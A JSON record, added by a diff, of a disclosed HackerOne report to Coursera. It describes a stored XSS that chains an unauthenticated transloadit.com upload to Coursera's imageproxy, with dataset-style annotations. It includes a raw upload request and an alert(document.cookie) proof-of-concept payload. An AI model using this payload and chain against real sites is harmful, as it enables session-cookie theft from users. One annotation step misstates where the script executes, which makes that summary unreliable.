@@ -1,0 +1,49 @@
+{
+    "reported_to": "Coursera",
+    "reported_by": "c0rdis ",
+    "title": "Stored XSS via transloadit.com and imageproxy",
+    "content": "\nHello,\n<image_0>\nSteps to reproduce:\n1) Let's send html file with trivial XSS vector to transloadit.com. Please note that no authentication is required.\nPOST /assemblies/[hash]?redirect=false HTTP/1.1\nHost: isadora.transloadit.com\nReferer: https://api.coursera.org/account/profile\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary=---------------------------185739484714145007371896001880\nContent-Length: 521\n-----------------------------185739484714145007371896001845\nContent-Disposition: form-data; name=\"params\"\n{\"max_size\":1048576,\"auth\":{\"key\":\"[hash2]\"},\"template_id\":\"[hash3]\"}\n-----------------------------185739484714145007371896001845\nContent-Disposition: form-data; name=\"my_file\"; filename=\"stored_xss.html\"\nContent-Type: text/html\nCode 119 Bytes\n1<html>\n2<script>\n3alert(document.cookie);\n4</script>\n5</html>\n6-----------------------------185739484714145007371896001845--\n<image_1>\n<image_2>\nPlease find the screenshot attached.\nAA\n\n",
+    "severity": [
+        7.2,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-site Scripting (XSS) - Stored"
+    ],
+    "screenshots": {
+        "image_0": "due to poor input file validation on transloadit.com, it is possible to upload and process any filetype on their server, which would later be uploaded to coursera-profile-photos.s3.amazonaws.com. From there, since imageproxy trusts coursera-profile-photos.s3.amazonaws.com, one can fetch arbitrary content and, in case of javascript, get it executed in the browser.",
+        "image_1": "2) By accessing https://isadora.transloadit.com/assemblies/[hash]?seq=0&callback=, we can learn the URL of the uploaded malicious file (in this case it's http://coursera-profile-photos.s3.amazonaws.com\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588stored_xss.html)",
+        "image_2": "3) Since it's already trusted, we could use it to upload as the profile photo, or to fetch via imageproxy as mentioned above. Final URL: https://www.coursera.org/api/utilities/v1/imageproxy/http://coursera-profile-photos.s3.amazonaws.com\u2588\u2588\u2588\u2588\u2588stored_xss.html"
+    },
+    "disclosed_date": 1512095880,
+    "report_url": "https://hackerone.com/reports/216822",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Send an HTML file with a trivial XSS vector to transloadit.com via a POST request to /assemblies/[hash]?redirect=false"
+        ],
+        [
+            2,
+            "The HTML file contains a script that executes alert(document.cookie) when processed by the server"
+        ]
+    ],
+    "vuln_description": "This vulnerability is a stored XSS via transloadit.com and imageproxy. It allows an attacker to upload an HTML file containing malicious JavaScript, which is then stored and executed when the file is processed by the server, leading to potential cookie theft or other malicious actions.",
+    "reason": "The attack is straightforward and involves a single component (uploading a malicious HTML file). There are no complex interactions or state manipulations required, and the XSS vector is a common and well-known technique.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": true
+    },
+    "authnz_metadata": {
+        "reason": "The vulnerability involves uploading an HTML file with an XSS payload to a third-party service (transloadit.com) without authentication, which is not directly related to authentication or authorization within a single application. The methodology described focuses on testing authentication and authorization boundaries within the same application by swapping user sessions and resource IDs, not third-party service interactions.",
+        "is_detectable": false
+    }
+}
